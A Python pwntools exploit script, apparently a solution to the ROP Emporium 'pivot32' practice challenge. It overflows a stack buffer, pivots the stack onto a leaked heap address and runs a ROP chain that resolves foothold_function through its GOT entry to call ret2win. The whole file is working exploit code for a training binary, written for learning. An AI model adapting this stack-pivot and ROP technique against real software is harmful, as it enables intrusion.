#!/usr/bin/env python3
from pwn import *

# Startup the process and get the heap address from output
proc = process('pivot32')
data = proc.recv()
print(data.decode())
heap = int([n for n in data.split() if n.startswith(b'0x')][0],16)
print('[+] Heap location: ' + hex(heap))

# To launch process in gdb.
#gdb.attach(proc, 'break *pwnme+197')

# Heap Gadgets
foothold_call  = p32(0x08048520) # .plt location of foothold_function
foothold_reloc = p32(0x0804a024) # .got.plt location (points to actual address of foothold_function)
load_eax       = p32(0x08048830) # : mov eax, dword ptr [eax] ; ret
pop_ebx        = p32(0x080484a9) # : pop ebx ; ret
add_eax_ebx    = p32(0x08048833) # : add eax, ebx ; ret
call_eax       = p32(0x080485f0) # : call eax

# Stack Gadgets
pop_eax      = p32(0x0804882c) # : pop eax ; ret
xchg_eax_esp = p32(0x0804882e) # : xchg eax, esp ; ret

# Pivots the stack onto the "leaked" heap address
buf_stack = b'A'*44
buf_stack += pop_eax
buf_stack += p32(heap)
buf_stack += xchg_eax_esp

# Call foothold_function to resolve address
buf_heap = foothold_call
# Put resolved address into eax
buf_heap += pop_eax
buf_heap += foothold_reloc
buf_heap += load_eax
# Add the computed offset to ret2win (0x1f7)
buf_heap += pop_ebx
buf_heap += p32(0x1f7)
buf_heap += add_eax_ebx
# Call ret2win (address is in eax)
buf_heap += call_eax
# buf_heap needs to be 255 bytes long for read to work correctly?
buf_heap = buf_heap + b'G'*(255-len(buf_heap))

# The program asks for heap data first, then asks for the stack overflow
proc.sendline(buf_heap)
proc.sendline(buf_stack)

data = proc.recvall()
print(data.decode())
